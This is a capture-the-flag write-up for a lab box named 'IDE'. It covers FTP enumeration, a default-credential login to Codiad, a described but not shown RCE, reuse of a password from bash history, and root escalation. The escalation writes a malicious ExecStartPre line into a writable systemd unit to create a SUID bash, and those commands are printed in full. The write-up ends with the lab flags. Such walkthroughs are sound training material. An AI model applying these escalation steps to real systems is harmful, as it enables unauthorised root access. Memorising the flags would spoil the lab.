# CTF Writeup: IDE

**Target IP:** 10.48.129.142
**Hostname:** ide

## 1. Initial Access
Initial enumeration of the FTP service (Port 21) allowed anonymous login, revealing a file named `ftp_secret_file`. The content of the file was:
```
Hey john,
I have reset the password as you have asked. Please use the default password to login. 
Also, please take care of the image file ;)
- drac.
```
This suggested a user `john` and a "default password". 

Further enumeration identified a **Codiad IDE (v2.8.4)** instance running on port **62337**. Attempting to login with the credentials `john:password` was successful.

A known authenticated Remote Code Execution vulnerability exists in Codiad 2.8.4 (CVE-2018-14009) within the search component. By exploiting this, a reverse shell was obtained as the `www-data` user.

## 2. User Pivot
After obtaining a shell as `www-data`, system enumeration was performed. The `.bash_history` file for the user `drac` was found to contain a password in plain text:
```bash
mysql -u drac -p 'Th3dRaCULa1sR3aL'
```
Using these credentials (`drac:Th3dRaCULa1sR3aL`), initial SSH access to the machine was established.

## 3. Privilege Escalation
After logging in as `drac`, I checked for sudo privileges:
```bash
drac@ide:~$ sudo -l
Matching Defaults entries for drac on ide:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User drac may run the following commands on ide:
    (ALL : ALL) /usr/sbin/service vsftpd restart
```
The user `drac` has the ability to restart the `vsftpd` service as root.

I then checked the permissions of the `vsftpd` service unit file:
```bash
drac@ide:~$ ls -l /lib/systemd/system/vsftpd.service
-rw-rw-r-- 1 root drac 322 Mar 24 06:58 /lib/systemd/system/vsftpd.service
```
The file is writable by the `drac` group.

### Step 1: Modify the service file
I updated `/lib/systemd/system/vsftpd.service` to include a malicious `ExecStartPre` command that creates a SUID bash binary:
```ini
[Unit]
Description=vsftpd FTP server
After=network.target

[Service]
Type=simple
ExecStartPre=-/bin/mkdir -p /var/run/vsftpd/empty
ExecStartPre=/bin/sh -c "/bin/cp /bin/bash /tmp/rootbash && /bin/chmod +s /tmp/rootbash"
ExecStart=/usr/sbin/vsftpd /etc/vsftpd.conf
ExecReload=/bin/kill -HUP $MAINPID

[Install]
WantedBy=multi-user.target
```

### Step 2: Restart the service
I triggered the execution of the `ExecStartPre` command by restarting the service with sudo:
```bash
drac@ide:~$ sudo /usr/sbin/service vsftpd restart
```

### Step 3: Execute SUID binary
The restart created `/tmp/rootbash` with the SUID bit set. I then used it to obtain a root shell:
```bash
drac@ide:~$ /tmp/rootbash -p
```

## 4. Flags
- **User Flag:** `02930d21a8eb009f6d26361b2d24a466`
- **Root Flag:** `ce258cb16f47f1c66f0b0b77f4e0fb8d`